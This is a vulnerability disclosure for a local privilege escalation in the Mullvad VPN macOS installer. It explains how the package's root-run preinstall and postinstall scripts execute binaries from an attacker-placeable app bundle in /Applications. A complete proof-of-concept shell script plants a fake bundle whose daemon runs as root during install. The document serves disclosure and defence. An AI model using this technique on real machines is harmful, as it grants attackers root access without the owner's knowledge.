**tested versions**
Download the package installer for Mullvad VPN: https://mullvad.net/download/app/pkg/latest/ (`MullvadVPN-2025.9.pkg`)
Or download the latest package here: https://cdn.mullvad.net/app/desktop/releases/2025.9/MullvadVPN-2025.9.pkg

## details

The macOS installer package executes `preinstall` and `postinstall` scripts as root. In the affected `Mullvad VPN.pkg`, both scripts reference and/or execute binaries located inside `"$INSTALL_DIR/Mullvad VPN.app"` (`/Applications/Mullvad VPN.app`). This enables local privilege escalation when an attacker can pre-place an arbitrary Mullvad VPN.app bundle at the target location.

### root cause

1. root execution of an app-bundle binary in preinstall

`preinstall` attempts to stop the existing service by executing:
`"$INSTALL_DIR/Mullvad VPN.app/Contents/Resources/mullvad-setup" prepare-restart` (line 26 and 27) 

If an attacker can create a fake `Mullvad VPN.app` at that path, this results in arbitrary code execution as root during installation/upgrade.

2. LaunchDaemon executes a binary from `/Applications`

`postinstall` writes and loads `/Library/LaunchDaemons/net.mullvad.daemon.plist` with `RunAtLoad=true`, pointing `ProgramArguments` to:
`"$INSTALL_DIR/Mullvad VPN.app/Contents/Resources/mullvad-daemon"`

This starts a root LaunchDaemon whose executable resides in an app bundle located under `/Applications`, a location that is writable for local administrators (admin -> root are _different_ trust boundary on macOS).

3. `.localized` upgrade behavior can preserve an attacker-controlled bundle

On macOS, when an "upgrade" installs an application bundle but the existing app at the target path has a different `CFBundleIdentifier`, Installer may install the new bundle into an `*.localized` directory instead of replacing the existing one. If the attacker pre-creates `/Applications/Mullvad VPN.app` with a different bundle identifier, the genuine app can end up under `/Applications/Mullvad VPN.localized/…` while the attacker bundle at `/Applications/Mullvad VPN.app` remains. The scripts continue to reference `/Applications/Mullvad VPN.app`, causing root to execute attacker-controlled code.

## reproduce

save the shell script as `prepare.sh`
```sh
#!/bin/bash
# Title: Mullvad VPN Local Privilege Escalation via installer package
# Author: Kun Peeks (@SwayZGl1tZyyy)
# Monday 2 February 2026 (02-02-2026)
set -e

APP_PATH="/Applications/Mullvad VPN.app"
FAKE_BUNDLE_ID="com.fake.mullvad"

rm -rf "$APP_PATH"
mkdir -p "$APP_PATH/Contents/Resources"
mkdir -p "$APP_PATH/Contents/MacOS"

# malicious daemon (executed as root via launchd)
cat > "$APP_PATH/Contents/Resources/mullvad-daemon" << 'EOF'
#!/bin/bash
{
    echo "The victim has installed or updated mullvad!"
    echo "executed as: $(whoami)"
    echo "UID: $(id -u)"
    id
    date
} > /tmp/mullvad_pwned.txt
chmod 644 /tmp/mullvad_pwned.txt
logger "Mullvad poc executed as $(whoami)"
sleep 3600
EOF

chmod +x "$APP_PATH/Contents/Resources/mullvad-daemon"

# dummy main binary
cat > "$APP_PATH/Contents/MacOS/Mullvad VPN" << 'EOF'
#!/bin/bash
echo "Fake Mullvad"
EOF

chmod +x "$APP_PATH/Contents/MacOS/Mullvad VPN"

# Info.plist with fake bundle ID
cat > "$APP_PATH/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>${FAKE_BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>Mullvad VPN</string>
    <key>CFBundleShortVersionString</key>
    <string>2020.1</string>
    <key>CFBundleVersion</key>
    <string>2020.1</string>
    <key>CFBundleExecutable</key>
    <string>Mullvad VPN</string>
</dict>
</plist>
EOF

echo "[!] A real administrator should install Mullvad VPN .pkg"
echo "[!] after install, check: cat /tmp/mullvad_pwned.txt"
echo "[!] also check: sudo launchctl list | grep mullvad"
```

1. run the prepare script (`prepare.sh`)
3. wait till the user (victim) installs Mullvad VPN via the installer package.
5. root code executed without the user knowing.

## impact

>please note: on macOS administrator to root is a valid privilege escalation.

Local Privilege Escalation: A user with administrator privileges without a password can get root without knowing the administrator's password. 

